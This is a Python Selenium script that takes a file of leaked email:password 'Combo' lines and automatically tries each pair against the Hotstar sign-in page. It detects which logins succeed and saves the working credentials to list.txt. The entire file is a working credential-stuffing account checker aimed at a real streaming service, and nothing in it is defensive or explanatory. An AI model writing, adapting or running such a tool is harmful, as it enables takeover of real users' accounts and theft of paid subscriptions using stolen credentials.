from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
li=open("list.txt","a")
name_file=input("enter file name ")
ids=open(name_file,"r")
flag=0
for line in ids:
    if flag==1:
        li.write(" "+line+"\n")
        flag=0
    if "Combo" not in line:
        print('a')
        continue
    else:
        lined=line.split()
        email=lined[1].split(":")[0]
        pas=lined[1].split(":")[1]
        driver = webdriver.Chrome()
        driver.get("https://www.hotstar.com/subscribe/sign-in")
        login = driver.find_element_by_css_selector(".email-fb-button")
        login.click()
        element = driver.find_element_by_name("emailId")
        element.send_keys(email)
        submit = driver.find_element_by_css_selector(".submit-button")
        submit.click()
        time.sleep(3)
        try:
            element2 = driver.find_element_by_id("password")
        except:
            driver.close()
            continue
        element2.send_keys(pas)
        submit2 = driver.find_element_by_css_selector(".submit-button")
        submit2.click()
        time.sleep(5)
        if driver.current_url=="https://www.hotstar.com/":
            driver.get("https://www.hotstar.com/subscribe/my-account")
            try:
                element3=driver.find_element_by_css_selector(".imageloader.loaded")
                driver.close()
                continue
            except:
                li.write(email+" : "+pas)
                flag=1
                driver.close()
                continue
        else:
            driver.close()
            continue
